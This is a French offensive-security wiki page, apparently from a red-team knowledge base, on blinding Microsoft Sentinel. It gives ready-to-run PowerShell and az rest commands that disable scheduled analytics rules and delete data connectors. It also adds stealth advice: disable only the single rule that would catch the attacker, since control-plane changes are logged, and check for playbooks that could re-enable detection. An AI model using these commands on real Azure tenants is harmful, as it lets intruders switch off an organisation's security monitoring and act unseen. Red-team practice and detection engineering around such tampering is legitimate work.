---
title: "Sentinel : désactiver les règles d'analytics et arracher les connecteurs de données"
description: "Altérer les règles d'analytics et les connecteurs de données de Microsoft Sentinel pour aveugler la détection du SIEM."
keywords:
  - Sentinel
  - SIEM
  - règles d'analytics
  - connecteur de données
  - évasion de détection
---

# Sentinel

Microsoft Sentinel est le SIEM cloud construit au-dessus d'un workspace Log Analytics : les **connecteurs de données** y font entrer les événements, et les **règles d'analytics** les interrogent pour lever des incidents. Aveugler Sentinel consiste à arrêter le flux entrant (désactiver les connecteurs, ou couper les diagnostic settings qui alimentent le workspace) et à arrêter les détections (désactiver ou neutraliser les règles d'analytics planifiées) avant d'agir.

## Désactiver les règles qui se déclencheraient

La gestion de Sentinel passe par le resource provider `Microsoft.SecurityInsights`, piloté via REST ou le module PowerShell `Az.SecurityInsights` :

```powershell
# list enabled analytics rules, then disable the ones matching your activity
Get-AzSentinelAlertRule -ResourceGroupName <rg> -WorkspaceName <workspace>
Update-AzSentinelAlertRule -ResourceGroupName <rg> -WorkspaceName <workspace> `
  -RuleId <guid> -Scheduled -Enabled:$false
```

```bash
# same via the ARM REST surface (PATCH the rule to enabled:false)
az rest --method patch \
  --url "https://management.azure.com/subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.OperationalInsights/workspaces/<ws>/providers/Microsoft.SecurityInsights/alertRules/<guid>?api-version=2023-02-01" \
  --body '{"kind":"Scheduled","properties":{"enabled":false}}'
```

## Couper le flux entrant

```bash
# remove a Sentinel data connector so a source stops feeding the SIEM
az rest --method delete \
  --url "https://management.azure.com/subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.OperationalInsights/workspaces/<ws>/providers/Microsoft.SecurityInsights/dataConnectors/<id>?api-version=2023-02-01"
```

Assécher le workspace sous-jacent de ses logs (voir [Azure Monitor](azure-monitor.md)) aveugle toutes les règles Sentinel d'un coup, puisqu'elles interrogent toutes ce workspace.

## Notes d'exploitation

- Désactiver une seule règle planifiée est chirurgical et discret ; arracher un connecteur ou le flux du workspace est large mais voyant. Ajustez le rayon d'action au degré de surveillance de Sentinel.
- Les changements de règle et de connecteur sont eux-mêmes des écritures du plan de contrôle dans l'[Activity Log](activity-log.md), et un SOC peut alerter sur l'auto-altération de Sentinel ; préférez restreindre la seule règle qui vous attraperait.
- Les règles d'automatisation et les playbooks (Logic Apps) peuvent réactiver ou ré-alerter ; vérifiez leur présence avant de supposer qu'une règle désactivée le reste.

## Outils

- Module PowerShell **Az.SecurityInsights** et **az rest** contre `Microsoft.SecurityInsights`.
- **MicroBurst** : énumération du workspace et de Sentinel.

## Références

- [HackTricks Cloud : Azure](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [Stratus Red Team : techniques Azure](https://stratus-red-team.cloud/attack-techniques/azure/)
- [Microsoft : API REST des règles d'alerte Sentinel](https://learn.microsoft.com/rest/api/securityinsights/alert-rules)
